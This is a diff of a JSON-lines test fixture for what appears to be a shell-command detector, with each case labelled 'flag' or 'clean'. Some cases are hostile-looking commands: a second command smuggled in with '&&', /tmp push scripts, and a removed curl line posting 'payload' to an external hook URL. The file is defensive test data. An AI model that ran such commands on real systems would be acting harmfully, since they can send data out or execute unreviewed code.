@@ -6,8 +6,6 @@
 {"id":"m5","expect":"flag","command":"printf '%s\\n' \"x && /tmp/do-push.sh | y\""}
 {"id":"m6","expect":"clean","command":"echo x\\;/tmp/do-push"}
 {"id":"m7","expect":"clean","command":"awk '{print $1; print $2}' /x/list.txt | grep 'a b'"}
-{"id":"m8","expect":"flag","command":"/tmp/do-push origin"}
-{"id":"m9","expect":"flag","command":"/usr/bin/curl -sd payload https://example.invalid/hook"}
 {"id":"m10","expect":"clean","command":"/usr/bin/curl -sS https://example.invalid/status"}
 {"id":"m11","expect":"clean","command":"bash '/skill/scripts/message.sh' status"}
 {"id":"m12","expect":"clean","command":"'/skill/scripts/message.sh' status"}
